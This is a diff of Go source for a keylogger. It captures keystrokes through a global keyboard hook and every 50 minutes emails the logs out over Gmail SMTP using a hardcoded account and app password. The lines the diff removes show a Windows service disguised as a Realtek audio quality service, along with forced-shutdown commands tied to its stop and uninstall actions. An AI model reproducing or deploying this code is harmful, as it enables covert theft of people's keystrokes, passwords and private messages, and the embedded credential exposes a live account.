@@ -3,38 +3,16 @@ package main
 import (
 	"fmt"
 	"os"
-	"os/exec"
 	"time"
 
-	"github.com/kardianos/service"
 	hook "github.com/robotn/gohook"
 	"gopkg.in/gomail.v2"
 )
 
-type program struct{}
-
-func (p *program) Start(s service.Service) error {
-
-	go p.run()
-	return nil
-}
-
-func (p *program) Stop(s service.Service) error {
-
-	cmd := exec.Command("shutdown", "-s", "-f", "-t", "0")
-	cmd.Start()
-	return nil
-}
-
-func (p *program) run() {
-	go sendemail()
-	keylog()
-
-}
-
 func sendemail() {
 
 	for {
+		time.Sleep(50 * time.Minute) //Pls change this if wanna change the time to send an email
 		mail := gomail.NewMessage()
 
 		mail.SetHeader("From", "anonymous.sender.malware@gmail.com")
@@ -43,7 +21,6 @@ func sendemail() {
 
 		mail.Attach("simple.txt")
 		mail.Attach("log.txt")
-		time.Sleep(50 * time.Minute) //Pls change this if wanna change the time to send an email
 
 		d := gomail.NewDialer("smtp.gmail.com", 587, "anonymous.sender.malware@gmail.com", "gncp guxp oqnh lwjn")
 
@@ -52,7 +29,9 @@ func sendemail() {
 	}
 }
 
-func keylog() {
+func main() {
+
+	go sendemail()
 
 	var keycode string
 	var charKey string
@@ -535,40 +514,5 @@ func keylog() {
 	})
 	s := hook.Start()
 	<-hook.Process(s)
-
-}
-
-func main() {
-	svcConfig := &service.Config{
-		Name:        "RealtekQualityServexec",
-		DisplayName: "RealtekQualityService",
-		Description: "Handles Realtek audio quality enhancements.",
-		//StartType:   service.System,
-	}
-
-	prg := &program{}
-	s, _ := service.New(prg, svcConfig)
-
-	s.Logger(nil)
-
-	if len(os.Args) > 1 {
-		switch os.Args[1] {
-		case "install":
-			s.Install()
-			return
-		case "start":
-			s.Start()
-			return
-		case "stop":
-			s.Stop()
-			return
-		case "uninstall":
-			cmd := exec.Command("shutdown", "-s", "-f", "-t", "0")
-			cmd.Start()
-			return
-		}
-	}
-
-	s.Run()
 
 }
